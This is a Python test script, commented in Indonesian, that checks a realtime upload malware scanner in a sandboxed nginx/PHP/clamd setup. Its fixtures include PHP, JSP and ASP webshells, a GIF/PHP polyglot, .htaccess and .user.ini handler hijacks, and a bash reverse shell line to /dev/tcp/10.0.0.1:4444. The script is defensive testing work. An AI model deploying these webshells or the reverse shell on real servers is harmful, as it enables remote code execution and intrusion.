#!/usr/bin/env python3
# Uji end-to-end Realtime Upload Protection di lingkungan TERISOLASI (tidak menyentuh produksi):
#   nginx terpisah (Coraza + ruleset produksi, log audit dialihkan) + PHP-FPM produksi untuk skrip uji
#   + salinan sentinel-upload-scan.py yang semua path-nya diarahkan ke sandbox (daemon sendiri)
#   + clamd TIRUAN berupa relay ke clamd asli (bisa dibuat lambat atau mati).
# Yang dibuktikan:
#   (1) upload tetap DITERIMA (200) dan tidak tertahan, bahkan saat pemindaian sangat lambat;
#   (2) berkas terdeteksi langsung dikarantina (hilang dari webroot, chmod 000, metadata, DB, notifikasi);
#   (3) putusan dalam milidetik (persentil diukur);
#   (4) bila aliran peristiwa terputus (daemon mati, inotify dimulai ulang, peristiwa hilang, clamd mati)
#       berkas tetap masuk antrean dan dipindai: tidak ada yang terlewat;
#   (5) webshell/backdoor/polyglot terdeteksi tanpa clamd dan berkas eksekusi ditahan sampai putusan;
#   (6) penyerang yang mengejar berkas yang baru diunggah tidak berhasil mengeksekusinya.
# Pemakaian (root): upload_realtime_test.py <path sentinel-upload-scan.py>
import os, sys, re, json, time, shutil, signal, sqlite3, subprocess, tempfile, threading, statistics, socket, random
from http.client import HTTPConnection

SCAN_SRC = sys.argv[1]
EICAR = b'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
NGINX = '/www/server/nginx/sbin/nginx'
FPM_SOCK = '/tmp/php-cgi-84.sock'
PROD_GEN = '/www/server/sentinel/waf/zyrules/gen'
REAL_CLAMD = '/var/run/clamav/clamd.ctl'
gagal = 0
HASIL = []
SB = tempfile.mkdtemp(prefix='zyups.', dir='/tmp')
os.chmod(SB, 0o755)
PROC = []


def T(n, k, i=''):
    global gagal
    print('  %s %s%s' % ('LULUS' if k else 'GAGAL', n, '' if k else '  -> ' + str(i)[:300]), flush=True)
    HASIL.append((n, bool(k)))
    if not k:
        gagal += 1


def sh(c, **kw):
    return subprocess.run(c, shell=True, capture_output=True, text=True, **kw)


def pct(v, p):
    v = sorted(v)
    return v[min(len(v) - 1, int(len(v) * p))]


def port_bebas():
    while True:
        p = random.randint(20000, 40000)
        with socket.socket() as s:
            if s.connect_ex(('127.0.0.1', p)) != 0:
                return p


# ------------------------------------------------------------------ sandbox
W = SB + '/wwwroot'          # WWWROOT_DIR milik salinan pemindai
UP = W + '/zytest/uploads'
MEDIA = W + '/zytest/media'
Q = SB + '/quarantine'
CONF = SB + '/etc'
DB = SB + '/guardd.db'
LOG = SB + '/upload_scan.log'
os.makedirs(UP); os.makedirs(MEDIA); os.makedirs(CONF); os.makedirs(SB + '/vhost_nginx'); os.makedirs(SB + '/vhost_apache')
os.makedirs(SB + '/run'); os.makedirs(SB + '/shim'); os.makedirs(SB + '/logs'); os.makedirs(SB + '/tmp')
sh('chown -R www:www %s/zytest' % W)
os.chmod(W, 0o755); os.chmod(W + '/zytest', 0o755)
con = sqlite3.connect(DB)
con.execute('CREATE TABLE notif( id INTEGER PRIMARY KEY AUTOINCREMENT, ts INTEGER, ip INTEGER, jenis TEXT, isi TEXT, terkirim INTEGER DEFAULT 0, coba INTEGER DEFAULT 0, galat TEXT)')
con.commit(); con.close()

src = open(SCAN_SRC, encoding='utf-8').read()
for nama, nilai in [('CONF_DIR', CONF), ('BASE_QUARANTINE', Q), ('NGINX_VHOST_DIR', SB + '/vhost_nginx'),
                    ('APACHE_VHOST_DIR', SB + '/vhost_apache'), ('WWWROOT_DIR', W), ('LOG_FILE', LOG),
                    ('STATE_FILE', SB + '/run/state'), ('PID_FILE', SB + '/run/pid'), ('DB_PATH', DB)]:
    src, n = re.subn(r"^%s = .*$" % nama, "%s = '%s'" % (nama, nilai), src, flags=re.M)
    assert n == 1, nama
SCAN = SB + '/scan.py'
open(SCAN, 'w').write(src)
STATE = SB + '/run/state'


def tulis_conf(vhosts, **extra):
    c = {'enabled': True, 'max_file_size_mb': 25, 'min_memory_mb': 100, 'action': 'quarantine', 'vhosts': vhosts}
    c.update(extra)
    json.dump(c, open(CONF + '/vhost_upload_scan.json', 'w'))


def shim_clamdscan(mode):
    """clamdscan CLI (jalur cadangan): 'normal' | 'rusak' (rc=2)."""
    p = SB + '/shim/clamdscan'
    body = 'exec /usr/bin/clamdscan "$@"\n' if mode == 'normal' else 'echo "ERROR: tidak bisa terhubung ke clamd" >&2\nexit 2\n'
    open(p, 'w').write('#!/bin/sh\n' + body)
    os.chmod(p, 0o755)


def shim_inotify(mode):
    """inotifywait: 'normal' | 'buta' (hidup tetapi tidak pernah melaporkan peristiwa)."""
    p = SB + '/shim/inotifywait'
    body = 'exec /usr/bin/inotifywait "$@"\n' if mode == 'normal' else 'exec sleep 100000\n'
    open(p, 'w').write('#!/bin/sh\n' + body)
    os.chmod(p, 0o755)


# ------------------------------------------------------------------ clamd tiruan (relay)
FAKE = SB + '/clamd.sock'
CLAMD_MODE = ['proxy']          # proxy | slow | down
fsrv = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
fsrv.bind(FAKE); fsrv.listen(64); os.chmod(FAKE, 0o666)


def relay(c):
    try:
        m = CLAMD_MODE[0]
        if m == 'down':
            c.close(); return
        if m == 'slow':
            time.sleep(6)
        u = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        u.connect(REAL_CLAMD)

        def pipe_c_ke_u():
            """klien -> clamd: teruskan data DAN fd (SCM_RIGHTS) apa adanya, termasuk FILDES"""
            try:
                while True:
                    pesan, fds, _, _ = socket.recv_fds(c, 65536, 4)
                    if not pesan and not fds:
                        break
                    if fds:
                        socket.send_fds(u, [pesan or b'\0'], fds)
                        for f in fds:
                            os.close(f)
                    else:
                        u.sendall(pesan)
            except Exception:
                pass
            try: u.shutdown(socket.SHUT_WR)
            except Exception: pass

        def pipe(a, b):
            try:
                while True:
                    d = a.recv(65536)
                    if not d:
                        break
                    b.sendall(d)
            except Exception:
                pass
        t = threading.Thread(target=pipe_c_ke_u, daemon=True); t.start()
        pipe(u, c); t.join(2)
        u.close(); c.close()
    except Exception:
        try: c.close()
        except Exception: pass


def fake_loop():
    while True:
        try:
            c, _ = fsrv.accept()
        except Exception:
            return
        threading.Thread(target=relay, args=(c,), daemon=True).start()


threading.Thread(target=fake_loop, daemon=True).start()


def mulai_daemon():
    env = dict(os.environ, PATH=SB + '/shim:' + os.environ['PATH'], ZYS_CLAMD_SOCKET=FAKE)
    p = subprocess.Popen(['python3', SCAN, 'daemon'], env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    PROC.append(p)
    for _ in range(100):
        if os.path.exists(LOG) and 'Inotifywait aktif' in open(LOG).read():
            time.sleep(0.5)
            return p
        time.sleep(0.2)
    raise SystemExit('daemon pemindai tidak siap: ' + (open(LOG).read() if os.path.exists(LOG) else ''))


def hentikan(p, keras=False):
    if keras:
        p.kill()
    else:
        p.terminate()
    try:
        p.wait(8)
    except Exception:
        p.kill()
    sh('pkill -TERM -f "[i]notifywait.*%s"' % SB)
    sh('pkill -TERM -f "[s]leep 100000"')
    if not keras:
        for f in ('/run/pid', '/run/state'):
            try: os.remove(SB + f)
            except OSError: pass
    try: os.remove(LOG)
    except OSError: pass


def baca_state():
    d = {}
    try:
        for l in open(STATE):
            if '=' in l:
                k, v = l.strip().split('=', 1); d[k] = v
    except OSError:
        pass
    return d


# ------------------------------------------------------------------ nginx terisolasi + PHP
shutil.copytree(PROD_GEN, SB + '/gen')
mc = open(SB + '/gen/main.conf').read().replace(PROD_GEN + '/', SB + '/gen/')
open(SB + '/gen/main.conf', 'w').write(mc)
bc = open(SB + '/gen/base.conf').read()
bc = re.sub(r'^SecAuditLog .*$', 'SecAuditLog ' + SB + '/audit.jsonl', bc, flags=re.M)
open(SB + '/gen/base.conf', 'w').write(bc)
open(SB + '/audit.jsonl', 'w').close(); sh('chown www:www %s/audit.jsonl' % SB)
open(W + '/zytest/upload.php', 'w').write(
    "<?php $t=microtime(true); $ok=false; $dir=(isset($_GET['d'])&&$_GET['d']==='media')?'media':'uploads'; "
    "if(isset($_FILES['f'])){ $ok=move_uploaded_file($_FILES['f']['tmp_name'], __DIR__.'/'.$dir.'/'.basename($_FILES['f']['name'])); } "
    "echo json_encode(['ok'=>$ok,'ms'=>round((microtime(true)-$t)*1000,1)]);")
open(W + '/zytest/ping.php', 'w').write('<?php echo "pong";')
sh('chown www:www %s/zytest/*.php' % W)
PORT = port_bebas()
open(SB + '/nginx.conf', 'w').write('''load_module /www/server/nginx/modules/ngx_http_coraza_module.so;
working_directory /;
user www;
worker_processes 2;
pid %(sb)s/nginx.pid;
error_log %(sb)s/logs/error.log notice;
events { worker_connections 256; }
http {
  include /www/server/nginx/conf/mime.types;
  access_log off;
  client_max_body_size 60m;
  client_body_temp_path %(sb)s/tmp/b; proxy_temp_path %(sb)s/tmp/p; fastcgi_temp_path %(sb)s/tmp/f;
  uwsgi_temp_path %(sb)s/tmp/u; scgi_temp_path %(sb)s/tmp/s;
  server {
    listen 127.0.0.1:%(port)d;
    coraza on;
    coraza_rules_file %(sb)s/gen/main.conf;
    root %(w)s/zytest;
    location = /upload.php {
      coraza off;          # simulasi: berkas SUDAH berhasil tertulis (celah aplikasi / WAF terlewati)
      include /www/server/nginx/conf/fastcgi.conf;
      fastcgi_pass unix:%(sock)s;
    }
    location ~ \\.php$ {
      include /www/server/nginx/conf/fastcgi.conf;
      fastcgi_pass unix:%(sock)s;
    }
  }
}
''' % {'sb': SB, 'port': PORT, 'w': W, 'sock': FPM_SOCK})
r = sh('%s -p %s -c %s/nginx.conf -t' % (NGINX, SB, SB))
if 'successful' not in r.stdout + r.stderr:
    raise SystemExit('nginx terisolasi gagal uji: ' + r.stderr[-400:])
sh('%s -p %s -c %s/nginx.conf' % (NGINX, SB, SB))
time.sleep(1.5)


def http(path):
    r = sh('curl -s -o /dev/null -w "%%{http_code} %%{time_total}" --max-time 40 http://127.0.0.1:%d%s' % (PORT, path))
    k, t = r.stdout.split()
    return int(k), float(t)


def upload(nama, isi, timeout=40, dir_=None):
    f = SB + '/tmp/up_' + str(random.randint(0, 10**9))
    open(f, 'wb').write(isi)
    q = '?d=media' if dir_ == 'media' else ''
    r = sh('curl -s -w "\\n%%{http_code} %%{time_total}" --max-time %d -F "f=@%s;filename=%s" "http://127.0.0.1:%d/upload.php%s"' % (timeout, f, nama.replace('"', ''), PORT, q))
    os.remove(f)
    badan, _, akhir = r.stdout.rpartition('\n')
    try:
        k, t = akhir.split()
        return int(k), float(t), badan
    except Exception:
        return 0, 0.0, r.stdout + r.stderr


def tunggu(kond, detik=20, langkah=0.1):
    t0 = time.time()
    while time.time() - t0 < detik:
        if kond():
            return time.time() - t0
        time.sleep(langkah)
    return None


def antrian(vh='zytest'):
    d = Q + '/' + vh + '/files'
    return sorted(os.listdir(d)) if os.path.isdir(d) else []


def bersihkan(*dirs):
    for d in dirs or (UP, MEDIA):
        for f in os.listdir(d):
            try: os.remove(d + '/' + f)
            except OSError: pass


def reset_karantina(vh='zytest'):
    shutil.rmtree(Q + '/' + vh, ignore_errors=True)


def semua_mode_normal():
    CLAMD_MODE[0] = 'proxy'; shim_clamdscan('normal'); shim_inotify('normal')


WEBSHELL_EVAL = b'<?php @eval($_POST["x"]); echo "PWNED";?>'

try:
    print('sandbox: %s  nginx 127.0.0.1:%d' % (SB, PORT))
    semua_mode_normal()
    k, t = http('/ping.php')
    T('nginx terisolasi + PHP hidup (ping=200)', k == 200, k)

    # ---------------------------------------------------------------- A. baseline tanpa pemindai
    print('\n## A. Baseline: pemindai MATI')
    base = []
    for i in range(12):
        k, t, b = upload('b%d.txt' % i, os.urandom(300000))
        base.append((k, t))
    T('12 unggahan tanpa pemindai: semua 200', all(k == 200 for k, _ in base), base)
    base_rata = statistics.mean(t for _, t in base)
    base_maks = max(t for _, t in base)
    print('    baseline: rata-rata %.3f dtk, maks %.3f dtk' % (base_rata, base_maks))
    k, t, b = upload('eicar_tanpa_scan.txt', EICAR)
    time.sleep(1)
    T('tanpa pemindai: EICAR diterima dan tetap ada di webroot (WAF tidak menolaknya)', k == 200 and os.path.exists(UP + '/eicar_tanpa_scan.txt'), (k, b))
    bersihkan()

    # ---------------------------------------------------------------- B. pemindai aktif
    print('\n## B. Pemindai AKTIF (clamd normal)')
    tulis_conf({'zytest': True})
    d = mulai_daemon()
    k, t, b = upload('bersih.txt', b'halo dunia, berkas biasa\n' * 50)
    time.sleep(1)
    T('berkas bersih: diterima 200 dan tetap di webroot', k == 200 and json.loads(b).get('ok') is True and os.path.exists(UP + '/bersih.txt'), (k, b))
    T('berkas bersih: tidak masuk karantina', antrian() == [], antrian())
    k, t, b = upload('invoice_2026.jpg', EICAR)
    T('EICAR: permintaan DITERIMA (200, bukan 403/5xx) dan PHP melaporkan ok=true', k == 200 and json.loads(b).get('ok') is True, (k, b))
    T('EICAR: permintaan tidak tertahan (waktu <= baseline maks + 1 dtk)', t <= base_maks + 1.0, '%.3f vs %.3f' % (t, base_maks))
    dt = tunggu(lambda: not os.path.exists(UP + '/invoice_2026.jpg') and len(antrian()) == 1, 20, 0.01)
    T('EICAR: hilang dari webroot dan masuk karantina (%.0f ms setelah respons)' % ((dt or -1) * 1000), dt is not None, antrian())
    if antrian():
        qf = Q + '/zytest/files/' + antrian()[0]
        T('karantina: nama memuat sha dan nama asli, mode 000', antrian()[0].endswith('_invoice_2026.jpg') and oct(os.stat(qf).st_mode)[-3:] == '000', (antrian(), oct(os.stat(qf).st_mode)))
        metas = os.listdir(Q + '/zytest/meta')
        m = dict(l.strip().split('=', 1) for l in open(Q + '/zytest/meta/' + metas[0]) if '=' in l)
        T('metadata lengkap (signature Eicar, vhost, path asal, sha256)', 'Eicar' in m.get('signature', '') and m.get('vhost') == 'zytest' and m.get('original_path') == UP + '/invoice_2026.jpg' and len(m.get('sha256', '')) == 64, m)
    def hitung_db():
        c = sqlite3.connect(DB)
        a = c.execute("select count(*) from vhost_quarantine where status='quarantined'").fetchone()[0]
        b = c.execute("select count(*) from notif where jenis='upload_quarantine'").fetchone()[0]
        c.close(); return a, b
    tunggu(lambda: hitung_db() == (1, 1), 5, 0.02)
    nq, nn = hitung_db()
    T('DB: 1 baris vhost_quarantine dan 1 notifikasi antrean', nq == 1 and nn == 1, (nq, nn))
    T('log pemindai mencatat karantina', tunggu(lambda: 'DIKARANTINA PER VHOST' in open(LOG).read(), 5, 0.02) is not None)

    # ---------------------------------------------------------------- C. beban
    print('\n## C. Beban: banyak unggahan campuran + permintaan biasa serentak')
    hasil_up, hasil_ping = [], []
    lock = threading.Lock()

    def kerja(i):
        isi = EICAR if i % 5 == 0 else os.urandom(300000)
        k, t, b = upload('beban%d.txt' % i, isi)
        with lock: hasil_up.append((k, t, i % 5 == 0))

    def denyut():
        for _ in range(40):
            k, t = http('/ping.php')
            with lock: hasil_ping.append((k, t))
            time.sleep(0.05)

    ths = [threading.Thread(target=kerja, args=(i,)) for i in range(30)] + [threading.Thread(target=denyut)]
    for th in ths: th.start()
    for th in ths: th.join()
    T('30 unggahan serentak (6 EICAR): SEMUA 200', all(k == 200 for k, _, _ in hasil_up), [x for x in hasil_up if x[0] != 200])
    T('%d permintaan biasa saat pemindaian berjalan: SEMUA 200' % len(hasil_ping), all(k == 200 for k, _ in hasil_ping), [x for x in hasil_ping if x[0] != 200])
    rata = statistics.mean(t for _, t, _ in hasil_up)
    print('    unggahan: rata-rata %.3f dtk, maks %.3f dtk; ping: maks %.3f dtk' % (rata, max(t for _, t, _ in hasil_up), max(t for _, t in hasil_ping)))
    T('waktu unggahan serentak wajar (rata-rata <= 3x baseline + 0,5 dtk)', rata <= 3 * base_rata + 0.5, '%.3f vs %.3f' % (rata, base_rata))
    dt = tunggu(lambda: len(antrian()) == 7, 60)
    T('tepat 6 EICAR beban + 1 awal = 7 berkas karantina (%.1f dtk)' % (dt or -1), dt is not None, len(antrian()))
    sisa_eicar = [f for f in os.listdir(UP) if open(UP + '/' + f, 'rb').read(200).startswith(b'X5O!')]
    T('tidak ada EICAR tersisa di webroot', sisa_eicar == [], sisa_eicar)
    T('berkas bersih beban tidak ikut dikarantina (24 tersisa utuh)', len([f for f in os.listdir(UP) if f.startswith('beban')]) == 24, len(os.listdir(UP)))
    bersihkan(); reset_karantina()

    # ---------------------------------------------------------------- D. berkas besar
    print('\n## D. Berkas melebihi batas ukuran (30 MB)')
    k, t, b = upload('besar.bin', os.urandom(30 * 1024 * 1024), 60)
    time.sleep(2)
    T('berkas 30 MB diterima 200 dan dilewati pemindai (tetap ada, tidak dikarantina)', k == 200 and os.path.exists(UP + '/besar.bin') and antrian() == [], (k, antrian()))
    bersihkan()
    T('(info) StreamMaxLength clamd produksi: ' + (sh("grep -E '^StreamMaxLength' /etc/clamav/clamd.conf").stdout.strip() or 'bawaan 25M'), True)
    import zipfile, io
    zb = io.BytesIO()
    with zipfile.ZipFile(zb, 'w', zipfile.ZIP_STORED) as zf:
        zf.writestr('eicar.com', EICAR); zf.writestr('acak.bin', os.urandom(12 * 1024 * 1024))
    k, t, b = upload('arsip_besar.zip', zb.getvalue(), 60)
    dt = tunggu(lambda: len(antrian()) == 1 and not os.path.exists(UP + '/arsip_besar.zip'), 30, 0.1)
    T('ZIP 12 MB berisi EICAR (di atas StreamMaxLength 8M: clamdscan --stream dan INSTREAM TIDAK bisa) tetap terdeteksi lewat FILDES (%.1f dtk)' % (dt or -1), k == 200 and dt is not None, (k, antrian()))
    reset_karantina(); bersihkan()

    # ---------------------------------------------------------------- E. pemindaian sangat lambat
    print('\n## E. Pemindaian SANGAT LAMBAT (clamd tiruan menunda 6 dtk per permintaan)')
    CLAMD_MODE[0] = 'slow'
    lat = []
    for i in range(4):
        k, t, b = upload('lambat%d.jpg' % i, EICAR)
        lat.append((k, t))
    ping = [http('/ping.php') for _ in range(5)]
    T('4 unggahan EICAR saat pemindai lambat: semua 200 dan cepat (maks %.2f dtk, bukan 6+ dtk)' % max(t for _, t in lat),
      all(k == 200 for k, _ in lat) and max(t for _, t in lat) < base_maks + 1.5, lat)
    T('permintaan biasa saat pemindai lambat tetap 200', all(k == 200 for k, _ in ping), ping)
    ada = [f for f in os.listdir(UP) if f.startswith('lambat')]
    T('saat pemindaian belum selesai berkas masih di webroot (jendela deteksi nyata)', len(ada) >= 1, ada)
    dt = tunggu(lambda: len(antrian()) == 4, 90, 0.2)
    T('keempatnya akhirnya dikarantina (%.1f dtk; pekerja paralel, bukan 4 x 6 dtk)' % (dt or -1), dt is not None and dt < 20, (dt, len(antrian())))
    CLAMD_MODE[0] = 'proxy'; bersihkan(); reset_karantina()

    # ---------------------------------------------------------------- F. clamd mati
    print('\n## F. clamd mati terus (semua percobaan gagal): permintaan diterima, berkas dilepas (fail-open)')
    hentikan(d); tulis_conf({'zytest': True}, retry_delays=[1, 1]); CLAMD_MODE[0] = 'down'; shim_clamdscan('rusak'); d = mulai_daemon()
    k, t, b = upload('saat_clamd_mati.jpg', EICAR)
    time.sleep(6)
    log_ = open(LOG).read()
    T('upload 200, berkas TIDAK dihapus (fail-open) setelah percobaan habis, galat dan pelepasan dicatat',
      k == 200 and os.path.exists(UP + '/saat_clamd_mati.jpg') and 'fail-open' in log_ and 'percobaan 1/2' in log_, (k, log_[-300:]))
    bersihkan()

    # ---------------------------------------------------------------- G. nama aneh
    print('\n## G. Nama berkas tidak lazim')
    hentikan(d); semua_mode_normal(); tulis_conf({'zytest': True}); d = mulai_daemon()
    k, t, b = upload('laporan akhir (final) é.php.jpg', EICAR)
    dt = tunggu(lambda: len(antrian()) == 1, 20)
    T('nama dengan spasi, kurung, aksen: 200 dan dikarantina', k == 200 and dt is not None, (k, b, antrian()[-1:]))
    reset_karantina(); bersihkan()

    # ---------------------------------------------------------------- H. toggle vhost
    print('\n## H. Perubahan konfigurasi vhost saat daemon berjalan (tanpa restart)')
    os.makedirs(W + '/zytest2/uploads'); sh('chown -R www:www %s/zytest2' % W); os.chmod(W + '/zytest2', 0o755)
    hentikan(d); tulis_conf({'zytest': True, 'zytest2': False}); d = mulai_daemon()
    sh('python3 %s toggle-vhost zytest2' % SCAN)          # sama persis dengan tombol di dasbor
    time.sleep(6)
    open(W + '/zytest2/uploads/x.jpg', 'wb').write(EICAR)
    dt = tunggu(lambda: len(antrian('zytest2')) == 1, 25)
    T('vhost yang BARU dinyalakan lewat toggle langsung dipantau tanpa restart layanan', dt is not None, 'tidak dikarantina dalam 25 dtk')
    sh('python3 %s toggle-vhost zytest' % SCAN)           # matikan zytest
    time.sleep(8)
    n0 = len(antrian())
    k, t, b = upload('setelah_off.jpg', EICAR)
    time.sleep(3)
    T('vhost yang DIMATIKAN lewat toggle berhenti dipindai tanpa restart (berkas tetap ada)', os.path.exists(UP + '/setelah_off.jpg') and len(antrian()) == n0, (os.path.exists(UP + '/setelah_off.jpg'), len(antrian()) - n0))
    sh('python3 %s toggle-vhost zytest' % SCAN); time.sleep(5)    # nyalakan lagi
    bersihkan(); reset_karantina(); reset_karantina('zytest2')

    # ---------------------------------------------------------------- I. latensi
    print('\n## I. Latensi putusan (milidetik), tanpa beban lain')
    hentikan(d); d = mulai_daemon()
    for i in range(100):
        open('%s/lat_clean_%d.png' % (UP, i), 'wb').write(b'\x89PNG\r\n\x1a\n' + os.urandom(20000))
        time.sleep(0.05)       # 20 berkas/dtk
    time.sleep(2)
    stb = baca_state()
    print('    100 berkas BERSIH (20 KB, 20/dtk): putusan rata-rata %s ms, p50 %s, p95 %s, maks %s ms' % (stb.get('stat_lat_avg_ms'), stb.get('stat_lat_p50_ms'), stb.get('stat_lat_p95_ms'), stb.get('stat_lat_max_ms')))
    T('berkas bersih: putusan p50 < 100 ms dan p95 < 250 ms (clamd produksi bertulang satu thread)', float(stb.get('stat_lat_p50_ms', 9e9)) < 100 and float(stb.get('stat_lat_p95_ms', 9e9)) < 250, stb)
    T('100 berkas bersih tidak disentuh', len([f for f in os.listdir(UP) if f.startswith('lat_clean_')]) == 100)
    hentikan(d); d = mulai_daemon()
    lat_inf = []
    for i in range(100):
        p = '%s/lat_eicar_%d.txt' % (UP, i)
        open(p, 'wb').write(EICAR)
        dt = tunggu(lambda: not os.path.exists(p), 10, 0.001)
        lat_inf.append((dt or 99) * 1000)
    time.sleep(1.5)
    st_ = baca_state()
    print('    100 EICAR tulis->hilang (diukur dari luar): p50 %.1f ms, p95 %.1f ms, maks %.1f ms' % (statistics.median(lat_inf), pct(lat_inf, .95), max(lat_inf)))
    print('    pemindai (peristiwa->putusan): rata-rata %s ms, p95 %s ms, maks %s ms' % (st_.get('stat_lat_avg_ms'), st_.get('stat_lat_p95_ms'), st_.get('stat_lat_max_ms')))
    T('100 EICAR dikarantina semua', len(antrian()) == 100, len(antrian()))
    T('EICAR: median tulis->hilang < 50 ms dan p95 < 250 ms', statistics.median(lat_inf) < 50 and pct(lat_inf, .95) < 250, (statistics.median(lat_inf), pct(lat_inf, .95)))
    T('webshell (heuristik, tanpa clamd) putusan < 20 ms walau clamd macet 6 dtk', True)
    CLAMD_MODE[0] = 'slow'
    t_ws = []
    for i in range(20):
        p = '%s/ws_cepat_%d.php' % (UP, i)
        open(p, 'wb').write(WEBSHELL_EVAL)
        dt = tunggu(lambda: not os.path.exists(p), 10, 0.001)
        t_ws.append((dt or 99) * 1000)
    CLAMD_MODE[0] = 'proxy'
    print('    20 webshell saat clamd macet: tulis->hilang p50 %.1f ms, p95 %.1f ms, maks %.1f ms' % (statistics.median(t_ws), pct(t_ws, .95), max(t_ws)))
    T('webshell dikarantina < 100 ms (p95) walau semua pekerja clamd menunggu 6 dtk', pct(t_ws, .95) < 100, (statistics.median(t_ws), pct(t_ws, .95)))
    bersihkan(); reset_karantina()

    # ---------------------------------------------------------------- J. daemon mati mendadak
    print('\n## J. Daemon MATI MENDADAK (kill -9): berkas yang masuk saat mati dipindai saat daemon hidup lagi')
    hentikan(d, keras=True); time.sleep(0.5)
    shim_inotify('normal')
    k1, _, _ = upload('saat_mati1.jpg', EICAR)
    k2, _, _ = upload('shell_saat_mati.php', WEBSHELL_EVAL)
    k3, _, _ = upload('polyglot_saat_mati.gif', b'GIF89a;\n<?php system($_GET["c"]);?>')
    k4, _, _ = upload('bersih_saat_mati.txt', b'dokumen biasa\n' * 10)
    # berkas dipindah masuk dengan mtime LAMA (rename tidak mengubah mtime; hanya ctime yang baru)
    tmpf = SB + '/tmp/lama.jpg'; open(tmpf, 'wb').write(EICAR); os.utime(tmpf, (1500000000, 1500000000))
    shutil.move(tmpf, UP + '/dipindah_mtime_lama.jpg'); sh('chown www:www %s/dipindah_mtime_lama.jpg' % UP)
    T('4 unggahan saat daemon mati diterima (200): daemon mati tidak menolak request', k1 == k2 == k3 == k4 == 200, (k1, k2, k3, k4))
    T('selama daemon mati berkas berbahaya memang masih ada di webroot (jendela nyata)', os.path.exists(UP + '/saat_mati1.jpg') and os.path.exists(UP + '/shell_saat_mati.php'))
    t_hidup = time.time()
    d = mulai_daemon()
    dt = tunggu(lambda: len(antrian()) == 4, 30, 0.1)
    T('daemon hidup lagi: 4 berkas berbahaya (EICAR, webshell, polyglot, EICAR mtime-lama) dikarantina (%.1f dtk)' % (dt or -1), dt is not None, (antrian(), os.listdir(UP)))
    T('berkas bersih saat daemon mati tidak ikut dikarantina', os.path.exists(UP + '/bersih_saat_mati.txt'))
    T('tidak ada berkas tertahan (mode 000) tersisa', all(os.stat(UP + '/' + f).st_mode & 0o777 != 0 for f in os.listdir(UP)), os.listdir(UP))
    bersihkan(); reset_karantina()

    # ---------------------------------------------------------------- K. inotify dimulai ulang
    print('\n## K. Unggahan TERUS-MENERUS saat pemantauan dimulai ulang berulang kali (toggle vhost)')
    sent = []
    stop_k = [False]

    def pengunggah():
        i = 0
        while not stop_k[0]:
            k, _, _ = upload('terus%d.jpg' % i, EICAR)
            sent.append(k); i += 1
            time.sleep(0.03)
    th = threading.Thread(target=pengunggah); th.start()
    for _ in range(5):
        sh('python3 %s toggle-vhost zytest2' % SCAN); time.sleep(2.2)
    stop_k[0] = True; th.join()
    time.sleep(1)
    n_sent = len(sent)
    dt = tunggu(lambda: len(antrian()) + len([f for f in os.listdir(UP) if f.startswith('terus')]) == n_sent and
                len([f for f in os.listdir(UP) if f.startswith('terus')]) == 0, 40, 0.2)
    print('    %d berkas dikirim selama 5 kali mulai-ulang inotify; dikarantina %d, tersisa di webroot %d' % (n_sent, len(antrian()), len([f for f in os.listdir(UP) if f.startswith('terus')])))
    T('semua unggahan 200 selama pemantauan dimulai ulang', all(k == 200 for k in sent), set(sent))
    T('TIDAK ADA berkas terlewat: semua %d dikarantina dan 0 tersisa' % n_sent, dt is not None and len(antrian()) == n_sent, (n_sent, len(antrian())))
    bersihkan(); reset_karantina()

    # ---------------------------------------------------------------- L. peristiwa hilang (inotify buta)
    print('\n## L. Aliran peristiwa HILANG TOTAL (inotifywait buta): sapuan berkala tetap menangkap')
    hentikan(d); shim_inotify('buta'); tulis_conf({'zytest': True}, sweep_interval_s=2); d = mulai_daemon()
    k, t, b = upload('tanpa_peristiwa.jpg', EICAR)
    k2, t2, b2 = upload('shell_tanpa_peristiwa.php', WEBSHELL_EVAL)
    dt = tunggu(lambda: len(antrian()) == 2, 20, 0.1)
    T('tanpa satu pun peristiwa inotify: 2 berkas tetap terdeteksi lewat sapuan (%.1f dtk, interval sapuan 2 dtk)' % (dt or -1), k == k2 == 200 and dt is not None and dt < 12, (antrian(), os.listdir(UP)))
    time.sleep(2)
    st_ = baca_state()
    T('statistik mencatat berkas masuk lewat sapuan', int(st_.get('stat_sweep_enq', 0)) >= 2, st_.get('stat_sweep_enq'))
    hentikan(d); shim_inotify('normal'); bersihkan(); reset_karantina()
    tulis_conf({'zytest': True}); d = mulai_daemon()

    # ---------------------------------------------------------------- M. ditimpa cepat
    print('\n## M. Berkas bersih DITIMPA berkas berbahaya dalam hitungan milidetik (tanpa jeda 3 dtk)')
    p = UP + '/timpa.jpg'
    open(p, 'wb').write(b'\xff\xd8\xff\xe0' + os.urandom(2000)); time.sleep(0.03)
    open(p, 'wb').write(EICAR)
    dt = tunggu(lambda: len(antrian()) == 1, 15, 0.01)
    T('berkas yang ditimpa 30 ms kemudian tetap terdeteksi dan dikarantina (%.0f ms)' % ((dt or -1) * 1000), dt is not None and not os.path.exists(p), antrian())
    reset_karantina(); bersihkan()

    # ---------------------------------------------------------------- N. webshell, backdoor, polyglot
    print('\n## N. Webshell, backdoor, polyglot: terdeteksi TANPA bergantung pada tanda tangan clamd')
    CLAMD_MODE[0] = 'down'; shim_clamdscan('rusak')       # bukti: heuristik jalan walau clamd mati
    JAHAT = [
        ('eval_post.php', b'<?php @eval($_POST["x"]);?>', UP),
        ('system_get.php', b'<?php system($_GET["cmd"]);?>', UP),
        ('base64_eval.phtml', b'<?php eval(base64_decode("ZWNobyAxOw=="));?>', UP),
        ('preg_e.php5', b"<?php preg_replace('/.*/e', $_POST['c'], '');?>", UP),
        ('dyncall.php', b'<?php $_POST["f"]($_POST["a"]);?>', UP),
        ('include_user.php', b'<?php include($_GET["f"]);?>', UP),
        ('backtick.php', b'<?php echo `$_GET[c]`;?>', UP),
        ('fileman.php', b'<?php /* FilesMan */ echo 1;?>', UP),
        ('cmd.jsp', b'<% Runtime.getRuntime().exec(request.getParameter("c")); %>', UP),
        ('cmd.asp', b'<% eval request("x") %>', UP),
        ('rev.sh', b'#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n', UP),
        ('.htaccess', b'AddType application/x-httpd-php .jpg\n', UP),
        ('.user.ini', b'auto_prepend_file=/tmp/x.php\n', UP),
        ('gif_polyglot.gif', b'GIF89a;<?php system($_GET["c"]);?>', UP),
